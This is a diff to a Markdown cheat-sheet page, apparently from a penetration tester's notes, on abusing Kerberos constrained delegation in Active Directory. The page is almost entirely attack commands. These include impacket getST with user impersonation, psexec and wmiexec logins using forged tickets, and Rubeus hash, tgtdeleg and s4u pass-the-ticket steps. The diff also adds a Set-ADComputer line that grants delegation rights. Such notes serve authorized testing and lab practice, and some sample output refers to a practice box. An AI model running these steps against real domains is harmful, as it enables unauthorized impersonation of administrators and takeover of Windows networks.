@@ -1,7 +1,7 @@
 ---
 title: "AllowedToDelegate"
 date: 2024-7-23
-tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Allowedtodelegate", "Active Directory", "Windows"]
+tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "AllowedToDelegate", "Active Directory", "Windows", "AddAllowedtoAct", "AllowedToAct"]
 ---
 
 ### Privesc #1: Forge a Ticket
@@ -25,7 +25,7 @@ impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC_IP> -hashes :<HASH> -no-pas
 #### 2. Get a Service Ticket
 
 ```console
-sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn '<SERVICE>/<TARGET_DOMAIN>' -hashes :<HASH> -impersonate '<IMPERSONATE_USER>' '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC_IP> && impacket-getST -dc-ip <DC_IP> -spn '<SERVICE>/<TARGET_DOMAIN>' -hashes :<HASH> -impersonate '<IMPERSONATE_USER>' '<DOMAIN>/<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -72,7 +72,7 @@ $ export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccach
 
 ```console
 # psexec
-sudo ntpdate -s <DC> && impacket-psexec '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-psexec '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -94,7 +94,7 @@ C:\Windows\system32>
 
 ```console
 # wmiexec
-sudo ntpdate -s <DC> && wmiexec.py '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
+sudo ntpdate -s <DC_IP> && wmiexec.py '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -112,12 +112,18 @@ C:\>
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 1. Pre-Check
+#### 1. Add Delegate \[Optional\]
 
 ```console
 # Import powerview
 . .\PowerView.ps1
 ```
+
+```console
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount <USER>
+```
+
+#### 2. Check
 
 ```console
 # Check msds-allowedtodelegateto
@@ -127,13 +133,13 @@ Get-NetUser -TrustedToAuth
 {{< tab set1-2 tab1 active >}}Hash{{< /tab >}}{{< tab set1-2 tab2 >}}Kerberos{{< /tab >}}
 {{< tabcontent set1-2 tab1 >}}
 
-#### 2. Calculate Hash
+#### 3. Calculate Hash
 
 ```console
 .\rubeus.exe hash /password:'<PASSWORD>' /user:'<USER>' /domain:<DOMAIN>
 ```
 
-#### 3. Get a Service Ticket
+#### 4. Get a Service Ticket
 
 ```console
 .\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
@@ -191,13 +197,13 @@ Get-NetUser -TrustedToAuth
 {{< /tabcontent >}}
 {{< tabcontent set1-2 tab2 >}}
 
-#### 2. Request a TGT
+#### 3. Request a TGT
 
 ```console
 .\rubeus.exe tgtdeleg /nowrap /ptt
 ```
 
-#### 3. Get a Service Ticket
+#### 4. Get a Service Ticket
 
 ```console
 .\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
@@ -210,7 +216,7 @@ Get-NetUser -TrustedToAuth
 
 {{< /tabcontent >}}
 
-#### 4. Remote
+#### 5. Remote
 
 ```console
 # Check
